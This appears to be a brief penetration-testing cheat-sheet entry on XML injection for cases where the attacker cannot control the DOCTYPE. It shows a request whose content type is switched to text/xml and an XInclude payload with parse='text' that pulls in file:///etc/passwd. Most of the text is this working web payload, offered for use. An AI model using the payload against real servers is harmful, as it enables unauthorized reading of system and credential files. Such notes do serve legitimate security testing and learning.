#xmli #xml 

When client **can't control the entire XML** (can't control `DOCTYPE`). Example:

```http
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

## Try Change Content Type
```http
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```


## XInclude Attack (no DOCTYPE)

XInclude allows an XML document to be built from sub-documents. This can be used in any data value in an XML document. By default, XInclude will try to parse the included document as XML so we need to add `parse="text"`.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
	<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
